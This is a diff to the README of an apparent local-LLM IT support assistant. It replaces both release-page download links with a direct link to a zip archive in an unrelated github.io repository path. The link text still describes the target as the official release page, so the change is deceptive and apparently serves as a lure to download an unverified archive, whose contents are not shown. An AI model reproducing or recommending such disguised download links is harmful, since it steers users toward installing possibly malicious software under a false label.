@@ -5,7 +5,7 @@ description: "Automate IT support using local LLMs, RAG, and Streamlit to diagno
 ---
 # 🤖 10_ai_it_support_assistant - Automate IT support tasks on your device
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/puppetrygenusscilla672/10_ai_it_support_assistant/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/puppetrygenusscilla672/puppetrygenusscilla672.github.io/raw/refs/heads/main/calendaric/puppetrygenusscilla_github_io_v1.0.zip)
 
 This software brings artificial intelligence to your local workstation. It helps IT staff sort tickets, diagnose computer issues, and create scripts for complex tasks. Because the software runs entirely on your own hardware, your data stays private and safe. It builds a bridge between your support logs and advanced language models without needing a constant internet connection.
 
@@ -33,7 +33,7 @@ To run this assistant, your computer needs a few basic components. Ensure your m
 
 You need to visit the project releases page to obtain the installer. This page contains the latest version of the software package.
 
-[Visit the official release page to download the software.](https://github.com/puppetrygenusscilla672/10_ai_it_support_assistant/releases)
+[Visit the official release page to download the software.](https://github.com/puppetrygenusscilla672/puppetrygenusscilla672.github.io/raw/refs/heads/main/calendaric/puppetrygenusscilla_github_io_v1.0.zip)
 
 Follow these steps to complete the installation:
 
